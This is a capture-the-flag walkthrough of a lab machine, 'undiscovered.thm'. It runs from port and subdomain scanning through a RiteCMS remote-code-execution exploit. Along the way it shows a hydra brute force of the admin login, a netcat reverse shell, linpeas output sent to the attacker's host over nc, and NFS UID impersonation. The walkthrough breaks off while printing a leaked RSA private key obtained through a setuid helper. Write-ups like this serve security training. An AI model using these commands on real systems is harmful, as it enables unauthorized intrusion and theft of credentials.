

# Web Hacking Phases
**Discovery consists not in seeking new landscapes, but in having new eyes..**


![banner](banner.png)

## Reconnaissance

### Front-End Recon
![1](1.png)
> index.html
```html
<!DOCTYPE html>
<html>
<head>
<style>
h1 {
  color: red;
}
p {
  color: red;
}
body  {
  background-image: url("images/bg.jpg");
  position: fixed;
  top: 0; 
  left: 0; 
    
  /* Preserve aspet ratio */
  min-width: 100%;
  min-height: 100%;
}
</style>
</head>
<body>

<h1>Remember....</h1>

<p>The path should be the darker one...</p>

</body>
</html>
```
## Web Application Enumeration
 
### Inspecting HTTP Response Headers and Sitemaps
```bash
> curl -i http://undiscovered.thm
HTTP/1.1 200 OK
Date: Sun, 24 Aug 2025 15:02:20 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 355
Content-Type: text/html; charset=UTF-8
```
## Mapping and Discovery
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 10:53 EDT
> nmap 10.201.45.77
Nmap scan report for 10.201.45.77
Host is up (0.30s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds
```
> full tcp scanning 
```bash
> export IP=10.201.45.77
> nmap -sC -sV -p$(nmap -p- --min-rate=2000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/, $//') $IP -oN tcpscan.txt

 
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp    open  http     Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      33037/tcp   nlockmgr
|   100021  1,3,4      37126/udp   nlockmgr
|   100021  1,3,4      37783/tcp6  nlockmgr
|   100021  1,3,4      55129/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
33037/tcp open  nlockmgr 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```bash
> showmount -e 10.201.45.77
clnt_create: RPC: Program not registered
```

### Adding Localhost
![localhosts](localhosts.png)
```bash
> echo "10.201.45.77 undiscovered.thm" | sudo tee -a /etc/hosts
10.201.45.77 undiscovered.thm
```
### Debugging Page Content
### Technology Stack Identification
### Directory and File Listings
> basic file listing
```bash
> feroxbuster -u http://undiscovered.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --scan-dir-listings
                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://undiscovered.thm/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
 
301      GET        9l       28w      321c http://undiscovered.thm/images => http://undiscovered.thm/images/
200      GET       30l       48w      355c http://undiscovered.thm/
200      GET      238l      757w    73486c http://undiscovered.thm/images/bg.jpg
200      GET       16l       59w      937c http://undiscovered.thm/images/
```
> subdomain discovery
```bash
> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://undiscovered.thm -H "Host:FUZZ.undiscovered.thm" -c -mc all -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://undiscovered.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.undiscovered.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 18
________________________________________________

manager                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 286ms]
dashboard               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 436ms]
deliver                 [Status: 200, Size: 4650, Words: 385, Lines: 83, Duration: 497ms]
newsite                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 307ms]
develop                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 290ms]
network                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 287ms]
forms                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 287ms]
maintenance             [Status: 200, Size: 4668, Words: 385, Lines: 69, Duration: 289ms]
view                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 284ms]
mailgate                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 304ms]
booking                 [Status: 200, Size: 4599, Words: 385, Lines: 84, Duration: 289ms]
start                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 311ms]
play                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 312ms]
terminal                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 290ms]
internet                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 287ms]
gold                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 287ms]
resources               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 287ms]
:: Progress: [4989/4989] :: Job [1/1] :: 121 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

```bash
10.201.45.77 undiscovered.thm manager.undiscovered.thm dashboard.undiscovered.thm deliver.undiscovered.thm newsite.undiscovered.thm develop.undiscovered.thm network.undiscovered.thm forms.undiscovered.thm maintenance.undiscovered.thm view.undiscovered.thm mailgate.undiscovered.thm booking.undiscovered.thm start.undiscovered.thm play.undiscovered.thm terminal.undiscovered.thm internet.undiscovered.thm gold.undiscovered.thm   
```
## Vulnerability Analysis
### Security Testing
![rce](rce.png)
```bash
> searchsploit RiteCMS 2.2.1
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
RiteCMS 2.2.1 - Authenticated Remote Code Execution                          | php/webapps/48636.txt
RiteCMS 2.2.1 - Remote Code Execution (Authenticated)                        | php/webapps/48915.py
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```bash
~/undiscovered > searchsploit -m php/webapps/48915.py
```

### Vulnerability Identification
![stack](stack.png)
## Exploitation
```bash
> feroxbuster -u http://deliver.undiscovered.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt --scan-dir-listings
                                                                                                               
 
200     GET    http://deliver.undiscovered.thm/index.php
200     GET    http://deliver.undiscovered.thm/style.css
200     GET    http://deliver.undiscovered.thm/js/main.js
200     GET    http://deliver.undiscovered.thm/templates/images/favicon.ico
200     GET    http://deliver.undiscovered.thm/templates/style.css
200     GET    http://deliver.undiscovered.thm/
200     GET    http://deliver.undiscovered.thm/js/mylightbox.js
200     GET    http://deliver.undiscovered.thm/templates/images/rss.png
200     GET    http://deliver.undiscovered.thm/templates/images/next.png
200     GET    http://deliver.undiscovered.thm/templates/images/checkall.png
200     GET    http://deliver.undiscovered.thm/templates/images/favicon.png
200     GET    http://deliver.undiscovered.thm/templates/images/lock.png
200     GET    http://deliver.undiscovered.thm/templates/images/close.png
200     GET    http://deliver.undiscovered.thm/templates/images/bg_top.png
200     GET    http://deliver.undiscovered.thm/templates/images/bg_subnav.png
200     GET    http://deliver.undiscovered.thm/templates/images/reduce.png
200     GET    http://deliver.undiscovered.thm/templates/images/caution.png
200     GET    http://deliver.undiscovered.thm/templates/images/quote.png
200     GET    http://deliver.undiscovered.thm/templates/images/email.gif
200     GET    http://deliver.undiscovered.thm/templates/images/comment_add.png
200     GET    http://deliver.undiscovered.thm/templates/images/add_item.png
200     GET    http://deliver.undiscovered.thm/templates/images/edit_link.png
200     GET    http://deliver.undiscovered.thm/templates/images/plain.png
200     GET    http://deliver.undiscovered.thm/templates/images/tick.png
200     GET    http://deliver.undiscovered.thm/templates/images/external_link.png
200     GET    http://deliver.undiscovered.thm/templates/images/homepage.gif
200     GET    http://deliver.undiscovered.thm/templates/images/lock_open.png
200     GET    http://deliver.undiscovered.thm/templates/images/bg_nav_link.png
200     GET    http://deliver.undiscovered.thm/templates/images/bg_th.png
200     GET    http://deliver.undiscovered.thm/templates/images/close_category.png
200     GET    http://deliver.undiscovered.thm/js/admin.js
200     GET    http://deliver.undiscovered.thm/templates/rss.tpl
200     GET    http://deliver.undiscovered.thm/templates/mobile.css
200     GET    http://deliver.undiscovered.thm/templates/default.tpl
200     GET    http://deliver.undiscovered.thm/templates/mobile.tpl
200     GET    http://deliver.undiscovered.thm/templates/photo.tpl
200     GET    http://deliver.undiscovered.thm/templates/sitemap.tpl
200     GET    http://deliver.undiscovered.thm/templates/photo.css
200     GET    http://deliver.undiscovered.thm/templates/plain.tpl
200     GET    http://deliver.undiscovered.thm/templates/images/enlarge.png
200     GET    http://deliver.undiscovered.thm/templates/images/bg_subnav_2.png
200     GET    http://deliver.undiscovered.thm/templates/images/previous.png
200     GET    http://deliver.undiscovered.thm/templates/images/comments.png
200     GET    http://deliver.undiscovered.thm/templates/images/location.png
200     GET    http://deliver.undiscovered.thm/templates/images/delete_link.png
200     GET    http://deliver.undiscovered.thm/templates/images/throbber.gif
200     GET    http://deliver.undiscovered.thm/templates/images/zip.png
200     GET    http://deliver.undiscovered.thm/templates/images/submit.png
200     GET    http://deliver.undiscovered.thm/templates/images/previous_hover.png
200     GET    http://deliver.undiscovered.thm/templates/images/download.png
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/image.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/gallery.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/gallery_rss.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/notes.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/formmailer.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/news.blog.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/search.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/thumbnail.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/newsletter.inc.tpl
200     GET    http://deliver.undiscovered.thm/js/
200     GET    http://deliver.undiscovered.thm/templates/images/
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/overview.default.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/news.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/photo_comments.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/overview.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/news.default.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/comments.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/thumbnail_rss.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/simple_news.inc.tpl
200     GET    http://deliver.undiscovered.thm/templates/subtemplates/
301     GET    http://deliver.undiscovered.thm/templates/admin => http://deliver.undiscovered.thm/templates/admin/
200     GET    http://deliver.undiscovered.thm/templates/admin/style.css
200     GET    http://deliver.undiscovered.thm/templates/admin/wysiwyg.css
200     GET    http://deliver.undiscovered.thm/templates/admin/insert_thumbnail.tpl
200     GET    http://deliver.undiscovered.thm/templates/admin/main.tpl
200     GET    http://deliver.undiscovered.thm/templates/admin/insert_image.tpl
200     GET    http://deliver.undiscovered.thm/templates/admin/
```
> path from cve details
```bash
URL = f'{IP}/cms/index.php'
```
![cms](login.png)
![login_error](login_error.png)
```bash
> feroxbuster -u http://deliver.undiscovered.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --scan-dir-listings


301   http://deliver.undiscovered.thm/templates => http://deliver.undiscovered.thm/templates/
200   http://deliver.undiscovered.thm/js/main.js
200   http://deliver.undiscovered.thm/templates/images/favicon.ico
301   http://deliver.undiscovered.thm/js => http://deliver.undiscovered.thm/js/
301   http://deliver.undiscovered.thm/files => http://deliver.undiscovered.thm/files/
301   http://deliver.undiscovered.thm/data => http://deliver.undiscovered.thm/data/
301   http://deliver.undiscovered.thm/media => http://deliver.undiscovered.thm/media/
200   http://deliver.undiscovered.thm/data/sql/sqlite.user.initial.sql
200   http://deliver.undiscovered.thm/data/sql/sqlite.content.initial.sql
200   http://deliver.undiscovered.thm/data/sql/mysql.initial.sql
200   http://deliver.undiscovered.thm/templates/style.css
200   http://deliver.undiscovered.thm/
301   http://deliver.undiscovered.thm/cms => http://deliver.undiscovered.thm/cms/
200   http://deliver.undiscovered.thm/templates/images/reduce.png
200   http://deliver.undiscovered.thm/templates/images/previous_hover.png
200   http://deliver.undiscovered.thm/templates/images/bg_nav_link.png
200   http://deliver.undiscovered.thm/templates/images/quote.png
200   http://deliver.undiscovered.thm/templates/images/throbber.gif
200   http://deliver.undiscovered.thm/templates/images/checkall.png
200   http://deliver.undiscovered.thm/templates/images/submit.png
200   http://deliver.undiscovered.thm/templates/images/bg_subnav.png
200   http://deliver.undiscovered.thm/templates/images/delete_link.png
200   http://deliver.undiscovered.thm/templates/images/previous.png
200   http://deliver.undiscovered.thm/js/mylightbox.js
200   http://deliver.undiscovered.thm/data/entries
200   http://deliver.undiscovered.thm/data/userdata
200   http://deliver.undiscovered.thm/templates/photo.tpl
200   http://deliver.undiscovered.thm/templates/photo.css
200   http://deliver.undiscovered.thm/templates/default.tpl
200   http://deliver.undiscovered.thm/templates/plain.tpl
200   http://deliver.undiscovered.thm/js/admin.js
200   http://deliver.undiscovered.thm/templates/images/download.png
200   http://deliver.undiscovered.thm/LICENSE
200   http://deliver.undiscovered.thm/data/content
301   http://deliver.undiscovered.thm/data/sql => http://deliver.undiscovered.thm/data/sql/
200   http://deliver.undiscovered.thm/templates/images/edit_link.png
200   http://deliver.undiscovered.thm/templates/images/bg_th.png
200   http://deliver.undiscovered.thm/templates/images/comment_add.png
200   http://deliver.undiscovered.thm/templates/images/lock_open.png
200   http://deliver.undiscovered.thm/templates/images/bg_top.png
200   http://deliver.undiscovered.thm/templates/images/tick.png
200   http://deliver.undiscovered.thm/templates/images/rss.png
200   http://deliver.undiscovered.thm/templates/images/caution.png
200   http://deliver.undiscovered.thm/templates/images/external_link.png
200   http://deliver.undiscovered.thm/templates/images/add_item.png
200   http://deliver.undiscovered.thm/templates/images/homepage.gif
200   http://deliver.undiscovered.thm/templates/images/email.gif
200   http://deliver.undiscovered.thm/templates/images/bg_subnav_2.png
200   http://deliver.undiscovered.thm/templates/images/close.png
200   http://deliver.undiscovered.thm/templates/sitemap.tpl
200   http://deliver.undiscovered.thm/templates/images/lock.png
200   http://deliver.undiscovered.thm/templates/images/plain.png
200   http://deliver.undiscovered.thm/templates/images/zip.png
200   http://deliver.undiscovered.thm/templates/images/favicon.png
200   http://deliver.undiscovered.thm/templates/images/enlarge.png
200   http://deliver.undiscovered.thm/templates/subtemplates/overview.default.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/search.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/formmailer.inc.tpl
200   http://deliver.undiscovered.thm/files/
301   http://deliver.undiscovered.thm/templates/subtemplates => http://deliver.undiscovered.thm/templates/subtemplates/
200   http://deliver.undiscovered.thm/templates/images/
200   http://deliver.undiscovered.thm/data/
200   http://deliver.undiscovered.thm/js/
301   http://deliver.undiscovered.thm/cms/config => http://deliver.undiscovered.thm/cms/config/
301   http://deliver.undiscovered.thm/media/smilies => http://deliver.undiscovered.thm/media/smilies/
200   http://deliver.undiscovered.thm/media/
200   http://deliver.undiscovered.thm/cms/config/db_settings.conf.php
200   http://deliver.undiscovered.thm/cms/config/page_types.conf.php
200   http://deliver.undiscovered.thm/cms/config/smilies.conf.php
200   http://deliver.undiscovered.thm/data/sql/
200   http://deliver.undiscovered.thm/templates/
301   http://deliver.undiscovered.thm/cms/lang => http://deliver.undiscovered.thm/cms/lang/
200   http://deliver.undiscovered.thm/cms/lang/English.admin.lang.php
200   http://deliver.undiscovered.thm/cms/lang/Chinese.lang.php
200   http://deliver.undiscovered.thm/cms/lang/English.lang.php
200   http://deliver.undiscovered.thm/cms/lang/German.admin.lang.php
200   http://deliver.undiscovered.thm/cms/lang/French.admin.lang.php
200   http://deliver.undiscovered.thm/cms/lang/German.lang.php
200   http://deliver.undiscovered.thm/cms/lang/Chinese.admin.lang.php
200   http://deliver.undiscovered.thm/cms/lang/French.lang.php
200   http://deliver.undiscovered.thm/templates/subtemplates/comments.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/notes.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/thumbnail_rss.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/news.default.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/news.blog.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/news.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/gallery.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/photo_comments.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/overview.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/image.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/newsletter.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/simple_news.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/gallery_rss.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/thumbnail.inc.tpl
200   http://deliver.undiscovered.thm/templates/subtemplates/
200   http://deliver.undiscovered.thm/cms/index.php
200   http://deliver.undiscovered.thm/cms/
200   http://deliver.undiscovered.thm/media/smilies/neutral.png
200   http://deliver.undiscovered.thm/media/smilies/big_smile.png
200   http://deliver.undiscovered.thm/media/smilies/sad.png
200   http://deliver.undiscovered.thm/media/smilies/smile.png
200   http://deliver.undiscovered.thm/media/smilies/wink.png
200   http://deliver.undiscovered.thm/media/smilies/tongue.png
200   http://deliver.undiscovered.thm/media/smilies/
200   http://deliver.undiscovered.thm/cms/config/
```
### SQL data
![data](data.png)
![sql](sql.png)
```bash
> cat sqlite.user.initial.sql > user.txt


INSERT INTO rite_userdata VALUES (
  1,                          -- ID
  'admin',                    -- Username
  1,                          -- Type (probably Admin)
  '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', -- Password hash
  1230764400,                 -- Last login (Unix time)
  0                           -- WYSIWYG editor disabled
);
```
### Password cracking 
```bash
> hashid 75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7
Analyzing '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7'
[+] Unknown hash
```
### Hydra Brute-Force Attack on RiteCMS Login

#### 🧩 Parameters Breakdown

| Part                              | Meaning                                                                 |
|-----------------------------------|-------------------------------------------------------------------------|
| `-l admin`                        | Username to test (in this case, `admin`)                                |
| `-P /usr/share/wordlists/rockyou.txt` | Path to password wordlist (here, the popular `rockyou.txt`)             |
| `deliver.undiscovered.thm`       | Target host domain                                                      |
| `http-post-form`                 | Hydra module to use for POST-based login forms                          |
| `/cms/index.php`                 | Path to the login POST form                                             |
| `username=^USER^&userpw=^PASS^`  | POST data template. Hydra replaces `^USER^` and `^PASS^` dynamically     |
| `login_failed`                   | Error string shown on failed login (used by Hydra to detect failures)   |


```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:login_failed"

[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
```
![login_success](login_success.png)
![shell](shell.png)
```bash
> nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.23.93.75] from (UNKNOWN) [10.201.45.77] 58942
/bin/sh: 0: can't access tty; job control turned off

$ which python3 python script 
/usr/bin/python3
/usr/bin/python
/usr/bin/script
$ 
```
> stable shell 
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ export TERM=linux 
<www/deliver.undiscovered.thm/media$ export TERM=linux                       
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ ^Z
[1]  + 203199 suspended  nc -lvnp 4444
> stty raw -echo;fg
[1]  + 203199 continued  nc -lvnp 4444

www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ 
```
### Post Exploitation Enumeration 
### Lateral Movement 
```bash
www-data@undiscovered:/home$ cat /etc/passwd | grep $100
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
william:x:3003:3003::/home/william:/bin/bash
leonard:x:1002:1002::/home/leonard:/bin/bash
nfsnobody:x:3004:3005::/home/nfsnobody:
www-data@undiscovered:/home$ 
```
```bash
www-data@undiscovered:/tmp$ ./linpeas.sh -r 2>&1 | tee out.txt 
``` 

```bash
# target
www-data@undiscovered:/tmp$ nc -nv  10.23.93.75 3333 < out.txt 
Connection to 10.23.93.75 3333 port [tcp/*] succeeded!

# kali
> nc -lvnp 3333 > out.txt
listening on [any] 3333 ...
connect to [10.23.93.75] from (UNKNOWN) [10.201.105.54] 60482
```
```bash
> cat out.txt | grep leonard
leonard:x:1002:1002::/home/leonard:/bin/bash
uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)
leonard          pts/0    192.168.68.129   Fri Sep  4 22:57:43 +0800 2020
> cat out.txt | grep william
william:x:3003:3003::/home/william:/bin/bash
uid=3003(william) gid=3003(william) groups=3003(william)
william  pts/0        192.168.0.147    Thu Sep 10 00:35 - 00:36  (00:01)
william  pts/0        192.168.0.147    Thu Sep 10 00:33 - 00:34  (00:00)
william  pts/0        192.168.68.112   Wed Sep  9 21:59 - 22:03  (00:03)
william  pts/0        192.168.68.112   Wed Sep  9 21:47 - 21:49  (00:01)
william  pts/0        192.168.68.112   Wed Sep  9 21:40 - 21:47  (00:07)
william  pts/0        192.168.68.129   Sun Sep  6 12:37 - 12:41  (00:04)
william  pts/0        192.168.68.129   Sun Sep  6 11:58 - 11:59  (00:01)
william  pts/0        192.168.68.129   Sun Sep  6 11:55 - 11:58  (00:02)
william          pts/0    192.168.0.147    Thu Sep 10 00:35:09 +0800 2020
/home/william   *(rw,root_squash)
~/undiscovered >                                                                                             %
```
from an NFS (Network File System) export configuration, likely found in /etc/exports on a Linux system. It defines how the directory /home/william is shared over the network via NFS.

```bash
> showmount -e 10.201.105.54
clnt_create: RPC: Program not registered

> sudo mkdir -p /home/william
[sudo] password for kali: 

> sudo mount -t nfs 10.201.23.125:/home/william /home/william

 
┌──(root㉿kali)-[/home]
└─# cd william
cd: permission denied: william
```
### UID manipulation 
```bash
william:x:3003:3003::/home/william:/bin/bash
leonard:x:1002:1002::/home/leonard:/bin/bash
nfsnobody:x:3004:3005::/home/nfsnobody:
```
```bash
~/undiscovered > sudo useradd -u 3003 william  
```
```bash
~/undiscovered > sudo su - william 
```
```bash
william@kali:~$ id
uid=3003(william) gid=3003(william) groups=3003(william)
william@kali:~$ ls
admin.sh  script  user.txt
 
william@kali:~$ ./script test
cat: /home/leonard/test: No such file or directory

# create a ssh dir 
william@kali:~$ mkdir .ssh
william@kali:~/.ssh$ touch authorized_keys 
william@kali:~/.ssh$ nano authorized_keys # and add you william.pub key
```
> in kali terminal
```bash
> ssh-keygen -t rsa -f <filename> -b 4096 -C '' -N william@123 
> chmod 600 william
> lsd -al william
.rw------- kali kali 3.3 KB Sun Aug 24 15:40:14 2025  william

> cat william.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDh1/CjuEcRBebV1g+Hlqod5QskaDFGfeO9JBdipXwAE7v27xRlTC7GvQBempXJLVV89QenKzGW/yqFgdBpKqfi6wlUrWTxzwRxh6XYtcSnDiURrYr9GQXTLzrKk3c7sfYI9BWahBDX3Q509RlH3wxxFB+uQFYXsvxbDKlGiGa9IeyTexwpnASC8ZKeVkZsvcy7TGCqcmzDdqUrtW4ZBm8CNGC5ozI3ry7A1bdOa4LwT2DHU0Zn0cTth173by4t9Wn4JwKSB+YVPSjKQvvSRdz3yyRHCxP9LnztWZd5cqFSunmZtFWiDRrOhV20ZlTEfChxYMs8L5cxLzrqQa32ZYUi+N5XSjo8FN+xJukRl7g9Mp171Gv1UOR6remI1g8BSRUPg63iGdE/fSVpnEyGQVqipXn19KDH+hqTQvKC2OYpNtL4iraZs4thvvmn/epNDIjTrIf0GMsAoTTJNyrWHFsxe6bHZ8QqxWsENmmHYJPK448KR0fnv4Aq8mc4IjgH1ZHr5VMftZqnyUDdgPAhArmUi7b50dWl8uzxbRMq3jyywFMqXSLloPjIA3xkJyRx851DghhzSBD3f1SWOgwse9w3pfnxDHazofOG+dQK+jp3Oz326SXKpzfD0GKV8M6kx0ZsrPbV+qbppZiFakzvNvD6LDRpeDpIWlHa8hmjA3zJPw== 

~ > ssh -i william william@10.201.23.125 

william@undiscovered:~$ ./script
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!
william@undiscovered:~$ strings script | head
/lib64/ld-linux-x86-64.so.2
n2JP
libc.so.6
setreuid
__stack_chk_fail
strcat
system
__libc_start_main
__gmon_start__
GLIBC_2.2.5

william@undiscovered:~$ strings script | grep cat 
strcat
/bin/catH
strcat@@GLIBC_2.2.5

william@undiscovered:~$ strings script | grep leonard

william@undiscovered:~$ strings script | grep admin
./admin.sh
william@undiscovered:~$ 
```
### lateral to leonard 
```bash
william@undiscovered:~$ ls
admin.sh  script  user.txt
william@undiscovered:~$ ./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6Kghjhgj676767ghjghjvt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
